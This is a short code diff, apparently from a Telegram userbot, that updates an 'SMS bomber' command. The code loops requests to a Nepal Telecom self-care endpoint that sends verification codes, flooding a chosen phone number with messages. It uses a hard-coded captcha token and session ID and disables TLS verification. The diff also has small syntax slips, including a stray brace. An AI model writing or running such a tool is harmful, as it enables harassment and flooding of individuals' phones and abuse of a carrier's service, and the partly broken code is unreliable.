@@ -13,10 +13,11 @@ async def _(event):
     else:
         await event.edit("Enter a number!")
         return
-    paramss={"phone":num}
+    paramss={"webcaptcha":"2iBVFrLWrrezxoeI5u8duQpznGcudpxBQZM88Daf7ram7luqVkVKe8rsVxpM4nVunuNg7pGQ6Bb5jaUZdJnvkKXBn8nWBG890VRebIOsZM4%3D","JSESSIONID":"3854CCA90376DB14C75841F35A548032","2":"11","userName":num,"codeType":"1"}}
     await event.edit("`Bombing....`")
     for i in range (n):
-        requests.post("https://cms.ntc.net.np/api/generateAuthPassword",params=paramss)
+        requests.post("https://selfcare.ntc.net.np/selfcare4web/user/sendActivityCode.do",params=paramss,verify=False)
+        await event.edit(f"`Bombing.... {n}")
     await event.edit(f"`Bombed {n} SMS to {num}`")
 
     
